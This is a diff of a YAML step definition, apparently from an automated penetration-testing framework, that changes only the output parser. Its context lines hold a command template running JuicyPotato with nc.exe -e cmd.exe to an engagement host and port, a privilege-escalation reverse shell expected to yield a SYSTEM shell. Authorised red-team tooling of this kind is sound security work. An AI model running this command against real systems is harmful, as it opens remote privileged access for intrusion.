@@ -8,7 +8,7 @@ parameters:
   lport: from_engagement.lport
 command_template: JuicyPotato.exe -l 1337 -p cmd.exe -a '/c nc.exe {lhost} {lport}
   -e cmd.exe' -t *
-parser: null
+parser: generic_parser
 expected_effects:
 - system_shell_obtained
 falsifier:
